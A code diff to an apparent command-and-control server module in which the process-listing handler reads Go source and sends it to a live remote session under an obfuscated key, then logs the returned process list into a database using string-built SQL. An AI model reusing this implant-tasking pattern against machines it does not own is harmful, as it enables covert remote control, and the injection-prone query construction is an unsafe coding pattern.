@@ -3,6 +3,7 @@
 Imports are written to work both when executing from the project root
 as well as when running the server from inside src/Server.
 """
+
 from Modules.beacon.beacon import add_beacon_command_list
 from Modules.global_objects import logger, config, obfuscation_map
 from ServerDatabase.database import DatabaseClass
@@ -44,10 +45,24 @@ class Processes:
     def session(self, session: dict) -> None:
         """Request processes from a live session and store the result."""
         logger.info(f"Requesting processes from {session['userID']}")
-        send_data(session['conn'], self.command)
-        data = receive_data(session['conn'])
+
+        # Read the Go source code
+        source_path = Path(__file__).with_name("main.go")
+        with source_path.open("r", encoding="utf-8") as f:
+            source_code = f.read()
+
+        # Create the module data
+        module_data = {
+            "name": self.command,
+            "data": source_code,
+        }
+
+        # Send the module data to the client, using the obfuscated module name
+        send_data(session["conn"], json.dumps({"3rff": json.dumps(module_data)}))
+
+        data = receive_data(session["conn"])
         self.database.insert_entry(
             "Processes",
-            f'"{session["userID"]}", "{data.replace("\"", "\"\"")}", "{datetime.now()}"',
+            f'"{session["userID"]}", "{data.replace('"', '""')}", "{datetime.now()}"',
         )
         print(data)
